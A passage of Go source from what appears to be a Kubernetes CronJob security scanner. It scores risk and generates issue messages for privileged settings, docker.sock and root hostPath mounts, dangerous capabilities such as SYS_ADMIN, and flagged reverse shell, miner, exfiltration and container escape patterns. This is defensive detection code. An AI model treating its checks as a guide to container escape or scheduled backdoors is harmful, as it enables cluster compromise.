		score += 15
	}

	// Dangerous hostPaths (20 points max)
	for _, hp := range finding.HostPaths {
		if strings.Contains(hp, "docker.sock") || strings.Contains(hp, "containerd.sock") {
			score += 20
			break
		} else if hp == "/" || hp == "/:" {
			score += 15
			break
		} else {
			score += 5
		}
	}

	// Dangerous capabilities (15 points max)
	dangerousCaps := []string{"SYS_ADMIN", "SYS_MODULE", "SYS_RAWIO", "SYS_PTRACE", "DAC_READ_SEARCH", "NET_ADMIN"}
	for _, cap := range finding.Capabilities {
		for _, dangerousCap := range dangerousCaps {
			if strings.Contains(cap, dangerousCap) {
				score += 5
				break
			}
		}
	}

	// Schedule-based risk (20 points max)
	switch scheduleRisk {
	case shared.RiskCritical:
		score += 20
	case shared.RiskHigh:
		score += 15
	case shared.RiskMedium:
		score += 10
	case shared.RiskLow:
		score += 5
	}

	// Concurrency policy risk (10 points)
	if finding.ConcurrencyPolicy == "Allow" {
		score += 10
	}

	// Cloud role with high privileges (10 points)
	if finding.CloudRole != "" && (strings.Contains(strings.ToLower(finding.CloudRole), "admin") ||
		strings.Contains(strings.ToLower(finding.CloudRole), "cluster")) {
		score += 10
	}

	// Not suspended but has issues (5 points)
	if !finding.Suspend && (len(finding.BackdoorPatterns) > 0 || finding.Privileged) {
		score += 5
	}

	// Cap at 100
	if score > 100 {
		score = 100
	}

	return score
}

// generateCronJobSecurityIssues creates a list of specific security issues and recommendations
func generateCronJobSecurityIssues(finding CronJobFinding, scheduleRisk string) []string {
	var issues []string

	// Critical malicious activity
	if len(finding.ReverseShells) > 0 {
		issues = append(issues, fmt.Sprintf("CRITICAL: Reverse shell patterns detected: %s - scheduled backdoor execution", strings.Join(finding.ReverseShells, ", ")))
	}
	if len(finding.CryptoMiners) > 0 {
		issues = append(issues, fmt.Sprintf("CRITICAL: Crypto mining patterns detected: %s - scheduled resource abuse", strings.Join(finding.CryptoMiners, ", ")))
	}
	if len(finding.DataExfiltration) > 0 {
		issues = append(issues, fmt.Sprintf("CRITICAL: Data exfiltration patterns: %s - scheduled data theft", strings.Join(finding.DataExfiltration, ", ")))
	}
	if len(finding.ContainerEscape) > 0 {
		issues = append(issues, fmt.Sprintf("CRITICAL: Container escape techniques: %s - scheduled node compromise", strings.Join(finding.ContainerEscape, ", ")))
	}

	// Schedule-based risks
	if scheduleRisk == shared.RiskCritical {
		issues = append(issues, fmt.Sprintf("CRITICAL: Very frequent schedule (%s) - %s - potential DoS or aggressive attack", finding.Schedule, finding.ScheduleAnalysis))
	} else if scheduleRisk == shared.RiskHigh {
		issues = append(issues, fmt.Sprintf("HIGH: Frequent schedule (%s) - %s - review necessity", finding.Schedule, finding.ScheduleAnalysis))
	} else if scheduleRisk == shared.RiskMedium {
		issues = append(issues, fmt.Sprintf("MEDIUM: Moderate schedule (%s) - %s", finding.Schedule, finding.ScheduleAnalysis))
	}

	// Privileged access
	if finding.Privileged {
		issues = append(issues, "HIGH: Privileged CronJob - scheduled jobs have kernel access")
	}
	if finding.HostPID {
		issues = append(issues, "HIGH: hostPID enabled - scheduled jobs can view/kill host processes")
	}
	if finding.HostIPC {
		issues = append(issues, "MEDIUM: hostIPC enabled - scheduled jobs can access host IPC")
	}
	if finding.HostNetwork {
		issues = append(issues, "MEDIUM: hostNetwork enabled - scheduled jobs on host network")
	}

	// Dangerous hostPath mounts
	for _, hp := range finding.HostPaths {
		if strings.Contains(hp, "docker.sock") || strings.Contains(hp, "containerd.sock") {
			issues = append(issues, fmt.Sprintf("CRITICAL: Container runtime socket mounted (%s) - scheduled cluster admin access", hp))
		} else if hp == "/" || hp == "/:" {
			issues = append(issues, "CRITICAL: Root filesystem mounted - scheduled complete node access")
		} else if strings.Contains(hp, "/var/run") {
			issues = append(issues, fmt.Sprintf("HIGH: Sensitive path mounted: %s - review necessity", hp))
		} else {
			issues = append(issues, fmt.Sprintf("MEDIUM: HostPath volume: %s", hp))
		}
	}

	// Dangerous capabilities
	dangerousCaps := map[string]string{
		"SYS_ADMIN":       "full system administration",
		"SYS_MODULE":      "kernel module loading",
		"SYS_RAWIO":       "direct hardware access",
		"SYS_PTRACE":      "process debugging/injection",
		"DAC_READ_SEARCH": "bypass file read permissions",
		"NET_ADMIN":       "network configuration control",
		"SYS_BOOT":        "system reboot capability",
		"SYS_TIME":        "system time manipulation",
	}
	for _, cap := range finding.Capabilities {
		for dangerousCap, desc := range dangerousCaps {
			if strings.Contains(cap, dangerousCap) {
				issues = append(issues, fmt.Sprintf("HIGH: Dangerous capability %s - enables %s", dangerousCap, desc))
			}
		}
	}

	// Concurrency policy
	if finding.ConcurrencyPolicy == "Allow" {
		issues = append(issues, "MEDIUM: Concurrency policy 'Allow' - multiple jobs can run simultaneously (resource exhaustion risk)")
	}

	// Suspension status
	if finding.Suspend {
		issues = append(issues, "INFO: CronJob is suspended - not currently running")
	} else if len(finding.BackdoorPatterns) > 0 {
		issues = append(issues, "CRITICAL: Malicious CronJob is ACTIVE - executing on schedule")
	}

	// Cloud IAM role
	if finding.CloudRole != "" {
		if strings.Contains(strings.ToLower(finding.CloudRole), "admin") {
			issues = append(issues, fmt.Sprintf("HIGH: Cloud admin role assigned: %s - scheduled jobs have elevated cloud permissions", finding.CloudRole))
		} else {
			issues = append(issues, fmt.Sprintf("LOW: Cloud IAM role: %s - verify least privilege for scheduled tasks", finding.CloudRole))
		}
	}

	// Service account
	if finding.ServiceAccount == "default" {
		issues = append(issues, "LOW: Using default service account - should use dedicated ServiceAccount for scheduled jobs")
	}

	// Job history
	if finding.FailedJobsHistory > 5 {
		issues = append(issues, fmt.Sprintf("MEDIUM: High failed job count (%d) - investigate failures", finding.FailedJobsHistory))
	}

	// No issues found
	if len(issues) == 0 {
		issues = append(issues, "LOW: Standard CronJob configuration - no obvious security issues")
	}

	return issues
}
